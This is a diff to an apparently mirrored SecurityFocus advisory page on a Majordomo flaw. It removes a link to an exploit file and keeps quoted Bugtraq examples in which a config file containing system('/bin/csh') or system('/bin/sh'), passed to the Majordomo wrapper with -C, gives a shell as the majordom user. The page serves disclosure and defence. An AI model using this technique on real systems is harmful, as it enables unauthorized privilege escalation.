@@ -91,7 +91,7 @@
 </td>
 </tr>
 </table>
-</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x1000/903/majordomo-expl.c">#exploit_majordomo-expl.c</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+</div><br><br>#<br>#<br><br>#<br>#<div id="vulnerability">
 <span class="title"></span><br/><br/>
 	 The following, taken from Olaf Kirch &lt;okir@monad.swb.de&gt;'s Bugtraq post presents an example (taken from Shevek's post to a Great Circle Majordomo list):<br/><br/>shevek@tirin ~$ cat foo.pl<br/>system("/bin/csh");<br/>shevek@tirin ~$ /usr/local/majordomo/wrapper majordomo -C /home/shevek/foo.pl<br/>%<br/>%whoami<br/>majordom<br/>------<br/><br/>Here's another example (using a different script), posted to Bugtraq by Federico G. Schwindt &lt;Federico G. Schwindt&gt; on May 23, 2000:<br/><br/>$ cat /tmp/myconf<br/>system("/bin/sh");<br/>$ id<br/>uid=1000(fgsch) gid=1000(fgsch) groups=1000(fgsch), 0(wheel), 11(core)<br/>$ ./wrapper bounce-remind -C /tmp/myconf<br/>$ id<br/>uid=41(majordom) gid=41(majordom) groups=1000(fgsch), 0(wheel), 11(core)
 	
